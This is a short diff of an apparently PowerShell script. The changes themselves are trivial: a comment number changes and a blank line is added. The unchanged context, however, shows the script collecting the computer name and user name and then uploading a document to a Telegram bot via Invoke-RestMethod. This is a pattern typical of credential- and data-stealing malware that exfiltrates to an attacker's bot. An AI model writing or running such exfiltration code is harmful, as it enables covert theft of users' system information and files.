@@ -1,4 +1,4 @@
-#7
+#2
 
 $ComputerName = $env:COMPUTERNAME
 $UserName = $env:USERNAME
@@ -57,6 +57,7 @@ Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendDocument" `
                   -Body $body
 
 exit
+
 
 
 
